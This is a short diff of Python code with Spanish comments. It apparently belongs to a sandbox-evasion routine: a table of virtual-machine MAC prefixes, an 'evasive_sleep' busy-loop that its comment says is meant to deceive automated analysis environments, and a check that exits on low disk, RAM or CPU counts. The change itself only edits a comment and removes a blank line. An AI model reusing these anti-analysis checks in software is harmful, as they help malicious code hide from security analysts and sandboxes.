@@ -14,7 +14,7 @@ MAC_PREFIXES = {
         "Parallels": ["00:1C:42"]
     }
 
-def evasive_sleep(seconds): #retardo evasivo para engañar a los entornos de análisis
+def evasive_sleep(seconds): #retardo evasivo para engañar a los entornos de análisis automatizado
     start = time.perf_counter()
     while time.perf_counter() - start < seconds:
         _ = sum(random.randint(1, 100) for _ in range(10000))  # Cálculo inútil y costoso a nivel de CPU
@@ -33,7 +33,6 @@ def check_system_requirements(): #Comprobación de requerimientos de hardware
     cpu_cores = psutil.cpu_count(logical=False)  #
     ram = psutil.virtual_memory().total / (1024 ** 3)  
     disk = psutil.disk_usage('/').total / (1024 ** 3)  
-    
     if disk < 64 or ram < 4 or cpu_cores < 2:
         sys.exit(1)
 
